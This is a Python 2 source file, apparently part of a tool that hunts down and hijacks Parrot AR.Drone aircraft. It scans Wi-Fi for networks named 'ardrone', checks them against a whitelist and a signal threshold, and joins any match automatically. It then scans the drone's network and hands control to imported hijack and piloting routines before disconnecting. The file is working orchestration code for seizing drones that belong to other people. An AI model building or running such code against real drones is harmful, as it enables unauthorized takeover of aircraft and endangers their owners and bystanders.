###
###		Target MACVendors
###	A0143D	PARROT SA
###	9003B7	PARROT
###	00267E	Parrot SA
###	00121C	PARROT S.A.

import os
import re
import operator

from hijack import *
from power_to_distance import *
from net import *
import global_vars as glob
from pilot import *
import hw

shell_get_nets='iwlist '+glob.secondary_net_interface+' scan | grep "ESSID:\|Address:\|Signal level\|Frequency:"'

shell_disconnect='iwconfig '+glob.net_interface+' essid off'
shell_connect='iwconfig '+glob.net_interface+' essid '	#	+$essid
sheel_dhcp_connect='dhclient '+glob.net_interface

nets=[]

#def restore(srcIP,dstMAC):
#	os.system('python restore.py')

def disconnect():
	global shell_disconnect
        os.popen('ifconfig '+glob.net_interface+' down')
	os.popen('ifconfig '+glob.net_interface+' up')
	print 'disconnected'

def connect(essid):
	global shell_connect,sheel_dhcp_connect
	os.popen(shell_connect+essid)
	os.popen(sheel_dhcp_connect+' 2> /dev/null')

def scan():
	global shell_get_nets
        power_threshold = glob.power_threshold
        local_ip = glob.local_ip
	
		
	#retrieve networks infos
	output = os.popen(shell_get_nets).read()
	nets_array = output.split("\n")
	del nets_array[-1]	#last element is always empty because after the last \n there's nothing
	
	if len(nets_array)%4!=0:
		print 'len not multiple of 4'
		return

	
	i=0
	del nets[:]	#empty net list for the current scan	--	init
	while i<len(nets_array)/4:
		descriptor=nets_array[i*3]+"\n"+nets_array[(i*3)+1]+"\n"+nets_array[(i*3)+2]+"\n"+nets_array[(i*3)+3]
		nets.append(net(descriptor))
		i+=1
	
	
	found_drones = {}
	for n in nets:
		#print n.essid
		#if '156427' not in n.essid:
		#	continue
		if "ardrone" in n.essid:
			if glob.whitelist_mode_active:
                                print("Scanning for whitelist...Found "+n.essid)
				found_drones[n.essid] = n.rx_power
				continue
			elif glob.whitelist.has_key(n.essid):
				continue
			
			#x=n.rx_power
			#x=get_sig_pwr(n.essid)
			#print str(x)+'dbm'
			#print str(calculateDistance(x,2400))+'m'
			
			
			vendor_code=n.ap_mac[:-9]
			r = re.compile(r'A0:14:3D|90:03:B7|00:26:7E|00:12:1C')
			#if re.match(r,vendor_code):
			if int(n.rx_power)>=power_threshold:
				print 'Parrot detected ('+n.rx_power+'db) "'+n.essid+'" '+n.ap_mac
				connect(n.essid)
				local_ip=os.popen('ifconfig | grep -A2 "'+net_interface+'" | grep -Eo \'inet (addr:)?([0-9]*\.){3}[0-9]*\' | grep -Eo \'([0-9]*\.){3}[0-9]*\' | grep -v \'127.0.0.1\'').read()[:-1]
				print 'Connected: local_ip="'+local_ip+'"'
				scan_ips(local_ip)

                                hw.turn_on_red()
				pilot_routine(n.essid)
				
				stop_hijack()	
				disconnect()
                                hw.turn_off_red()
				#restore()

	#whitelisting
	if len(found_drones)>0:
                #get the closest drone
		sorted_drones = sorted(found_drones.items(), key=operator.itemgetter(1))
		white_drone = sorted_drones.pop()

		#add to whitelist
                if not glob.whitelist.has_key(white_drone[0]):
                        glob.whitelist[white_drone[0]] = True
                        print("Adding drone to whitelist: "+white_drone[0])
                else:
                        print("Drone already in whitelist: "+white_drone[0])
		#show success
                glob.whitelist_found = True
